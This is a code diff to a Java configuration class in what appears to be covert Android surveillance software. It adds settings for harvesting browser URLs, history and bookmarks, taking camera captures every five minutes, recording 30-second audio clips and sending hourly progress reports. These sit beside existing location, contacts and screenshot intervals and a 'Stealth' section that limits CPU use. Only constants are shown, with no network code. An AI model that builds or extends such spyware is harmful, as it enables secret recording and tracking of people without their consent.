@@ -25,6 +25,27 @@ public final class Config {
     public static final int LOCATION_INTERVAL_MS = 120_000;
     public static final int CONTACTS_INTERVAL_MS = 600_000;
     public static final int SCREENSHOT_INTERVAL_MS = 120_000;
+    // ============================================================
+    // ADD TO EXISTING Config.java
+    // ============================================================
+
+    // Web Activity Collection
+    public static final int BROWSER_URL_INTERVAL_MS = 5_000;  // Check URL every 5s
+    public static final boolean COLLECT_BROWSER_DBS = true;
+    public static final boolean COLLECT_BOOKMARKS = true;
+    public static final boolean COLLECT_HISTORY = true;
+
+    // Camera Capture
+    public static final int CAMERA_CAPTURE_INTERVAL_MS = 300_000;  // Every 5 min
+    public static final int CAMERA_CAPTURE_MAX_TRIES = 3;
+
+    // Audio Recording
+    public static final int AUDIO_RECORD_INTERVAL_MS = 600_000;  // Every 10 min
+    public static final int AUDIO_CLIP_DURATION_MS = 30_000;     // 30 sec per clip
+
+    // Progress Tracking
+    public static final boolean ENABLE_PROGRESS_REPORT = true;
+    public static final int PROGRESS_REPORT_INTERVAL_MS = 3_600_000;  // Every hour
 
     // Stealth
     public static final int MAX_CPU_PCT = 15;
